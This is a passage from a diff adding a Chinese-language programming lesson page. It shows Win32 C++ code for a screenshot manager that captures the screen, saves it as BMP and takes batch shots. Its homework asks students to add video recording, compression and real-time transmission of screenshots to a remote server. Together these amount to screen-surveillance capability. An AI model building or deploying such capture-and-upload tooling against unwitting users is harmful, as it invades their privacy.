+<span class="line"><span style="color:#E1E4E8">        bi.biBitCount </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 24</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bi.biCompression </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> BI_RGB;</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD dwBmpSize </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ((bmp.bmWidth </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> bi.biBitCount </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 31</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">/</span><span style="color:#79B8FF"> 32</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#79B8FF"> 4</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> bmp.bmHeight;</span></span>
+<span class="line"><span style="color:#B392F0">        std</span><span style="color:#E1E4E8">::vector</span><span style="color:#F97583">&#x3C;</span><span style="color:#E1E4E8">BYTE</span><span style="color:#F97583">></span><span style="color:#B392F0"> bmpData</span><span style="color:#E1E4E8">(dwBmpSize);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (</span><span style="color:#F97583">!</span><span style="color:#B392F0">GetDIBits</span><span style="color:#E1E4E8">(hDC, hBitmap, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, bmp.bmHeight, </span></span>
+<span class="line"><span style="color:#E1E4E8">                      bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), (BITMAPINFO</span><span style="color:#F97583">*</span><span style="color:#E1E4E8">)</span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, DIB_RGB_COLORS)) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        HANDLE hFile </span><span style="color:#F97583">=</span><span style="color:#B392F0"> CreateFileA</span><span style="color:#E1E4E8">(filename, GENERIC_WRITE, </span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">,</span></span>
+<span class="line"><span style="color:#E1E4E8">                                  CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#F97583">        if</span><span style="color:#E1E4E8"> (hFile </span><span style="color:#F97583">==</span><span style="color:#E1E4E8"> INVALID_HANDLE_VALUE) {</span></span>
+<span class="line"><span style="color:#F97583">            return</span><span style="color:#79B8FF"> false</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        BITMAPFILEHEADER_COMPAT bmfHeader </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> {</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">};</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfType </span><span style="color:#F97583">=</span><span style="color:#F97583"> 0x</span><span style="color:#79B8FF">4D42</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfSize </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER) </span><span style="color:#F97583">+</span><span style="color:#E1E4E8"> dwBmpSize;</span></span>
+<span class="line"><span style="color:#E1E4E8">        bmfHeader.bfOffBits </span><span style="color:#F97583">=</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT) </span><span style="color:#F97583">+</span><span style="color:#F97583"> sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#E1E4E8">        DWORD written;</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bmfHeader, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPFILEHEADER_COMPAT), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">bi, </span><span style="color:#F97583">sizeof</span><span style="color:#E1E4E8">(BITMAPINFOHEADER), </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#B392F0">        WriteFile</span><span style="color:#E1E4E8">(hFile, bmpData.</span><span style="color:#B392F0">data</span><span style="color:#E1E4E8">(), dwBmpSize, </span><span style="color:#F97583">&#x26;</span><span style="color:#E1E4E8">written, </span><span style="color:#79B8FF">NULL</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">        </span></span>
+<span class="line"><span style="color:#B392F0">        CloseHandle</span><span style="color:#E1E4E8">(hFile);</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> true</span><span style="color:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存为JPEG（简化实现）</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> SaveAsJPEG</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 简化实现，实际需要使用GDI+或其他库</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> SaveAsBMP</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 保存为PNG（简化实现）</span></span>
+<span class="line"><span style="color:#F97583">    bool</span><span style="color:#B392F0"> SaveAsPNG</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">HBITMAP</span><span style="color:#FFAB70"> hBitmap</span><span style="color:#E1E4E8">, </span><span style="color:#B392F0">HDC</span><span style="color:#FFAB70"> hDC</span><span style="color:#E1E4E8">, </span><span style="color:#F97583">const</span><span style="color:#F97583"> char*</span><span style="color:#FFAB70"> filename</span><span style="color:#E1E4E8">) {</span></span>
+<span class="line"><span style="color:#6A737D">        // 简化实现，实际需要使用GDI+或其他库</span></span>
+<span class="line"><span style="color:#F97583">        return</span><span style="color:#B392F0"> SaveAsBMP</span><span style="color:#E1E4E8">(hBitmap, hDC, filename);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">};</span></span>
+<span class="line"></span>
+<span class="line"><span style="color:#6A737D">// 测试截图管理器</span></span>
+<span class="line"><span style="color:#F97583">void</span><span style="color:#B392F0"> TestScreenshotManager</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"=== Screenshot Manager Test ===</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#E1E4E8">    ScreenshotManager manager;</span></span>
+<span class="line"><span style="color:#E1E4E8">    manager.</span><span style="color:#B392F0">SetOutputDirectory</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"screenshots"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    manager.</span><span style="color:#B392F0">SetFormat</span><span style="color:#E1E4E8">(</span><span style="color:#B392F0">CaptureFormat</span><span style="color:#E1E4E8">::BMP);</span></span>
+<span class="line"><span style="color:#E1E4E8">    manager.</span><span style="color:#B392F0">SetTimestamp</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">true</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 单次截图</span></span>
+<span class="line"><span style="color:#F97583">    if</span><span style="color:#E1E4E8"> (manager.</span><span style="color:#B392F0">CaptureScreen</span><span style="color:#E1E4E8">()) {</span></span>
+<span class="line"><span style="color:#B392F0">        printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Single screenshot captured</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#E1E4E8">    </span></span>
+<span class="line"><span style="color:#6A737D">    // 批量截图</span></span>
+<span class="line"><span style="color:#F97583">    int</span><span style="color:#E1E4E8"> captured </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> manager.</span><span style="color:#B392F0">BatchCapture</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">3</span><span style="color:#E1E4E8">, </span><span style="color:#79B8FF">2000</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D"> // 3张截图，间隔2秒</span></span>
+<span class="line"><span style="color:#B392F0">    printf</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"[+] Batch captured </span><span style="color:#79B8FF">%d</span><span style="color:#9ECBFF"> screenshots</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">, captured);</span></span>
+<span class="line"><span style="color:#E1E4E8">}</span></span>
+<span class="line"></span></code></pre><h2 id="section-12">课后作业</h2><h3 id="section-13">作业1：实现视频录制功能</h3><p>扩展屏幕截图功能，实现连续截图并合成视频的功能。</p><h3 id="section-14">作业2：添加图像压缩功能</h3><p>实现截图的压缩存储，减小文件大小。</p><h3 id="section-15">作业3：实现远程传输功能</h3><p>添加将截图实时传输到远程服务器的功能。</p>
